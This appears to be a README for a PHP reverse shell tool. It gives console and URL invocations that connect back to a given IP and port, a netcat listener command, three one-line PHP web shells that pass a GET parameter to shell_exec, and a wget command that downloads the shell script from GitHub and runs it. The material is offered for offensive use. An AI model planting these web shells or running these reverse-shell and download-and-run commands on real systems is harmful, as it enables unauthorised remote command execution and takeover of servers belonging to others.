# PHP Smart Reverse Shell script

## Script Commands
Call reverse shell from console
```shell
php ./srs.php 127.0.0.1 1234
```
Call reverse shell from url
```url
https://example.com/srs.php?ip=127.0.0.1&port=1234
```
Run command from url
```url
https://example.com/srs.php?c=ls%20-la
```
## Usefull commands

Wait for reverse shell connection
```shell
nc -l 127.0.0.1 4444
```

Executing shell code with PHP
```PHP
<?php echo shell_exec($_GET['command']);?>
```
or
```PHP
<?=isset($_GET['c'])?shell_exec($_GET['c']):'';?>
```
or 
```PHP
<?php if(isset($_GET['c'])){header('Content-Type: text/plain');die(shell_exec($_GET['c'.'2>&1']));}?>
```

Download Smart Reverse Shell and open shell connection
```shell
wget -O srs.php https://raw.githubusercontent.com/GramThanos/php-smart-reverse-shell/master/php-smart-reverse-shell.php
php ./srs.php 127.0.0.1 1234
```
